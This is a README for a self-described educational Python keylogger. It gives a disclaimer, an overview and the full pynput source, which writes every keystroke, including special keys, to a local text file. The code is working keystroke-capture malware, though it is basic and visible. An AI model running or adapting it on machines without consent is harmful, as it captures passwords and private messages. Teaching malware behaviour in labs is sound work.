# Ethical Keylogger Project

## 🚨 Disclaimer

This project is intended strictly for educational and research purposes within controlled environments such as virtual labs, cybersecurity courses, or red team/blue team training scenarios. </br>

- Do not use this tool to monitor, log, or interfere with any system or user without their explicit, informed consent. </br>

- Unauthorized use of keyloggers or similar software is a criminal offense in many jurisdictions and may violate privacy laws, terms of service, and organizational policies. </br>

- The author of this repository does not condone any illegal activity and is not responsible for any misuse of the code or tools contained herein. </br>

- Use at your own risk and only on systems you own or are legally authorized to test. </br>

## Overview

This project is a Python-based keylogger built for educational, cybersecurity, and malware simulation purposes. It captures and logs keystrokes on a local system, including both standard and special keys (e.g., Enter, Tab, Shift, Control), and writes them to a plain text file for analysis. The tool demonstrates fundamental techniques used in basic keylogging and forms the foundation for understanding more advanced topics in malware behavior, digital forensics, and threat simulation. </br>

Key features: </br>

- Real-time keystroke capture using the pynput library. </br>

- Logging of alphanumeric and special keys to key_log.txt. </br>

- Simple and extensible architecture suitable for malware lab simulations. </br>

- Designed for ethical use in controlled environments only. </br>

## Project

#### Keylogger Code

```shell
from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    print(f"Key pressed: {key}")  # Debug print
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.tab:
                f.write('\t')
            elif key == keyboard.Key.backspace:
                f.write('[Backspace]')
            elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
                f.write('[Shift]')
            elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
                f.write('[Control]')
            else:
                f.write(f'[{key}]')  # Log other special keys

with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener.join()
```

## Video Walkthrough

https://youtu.be/agXRtUbqxds
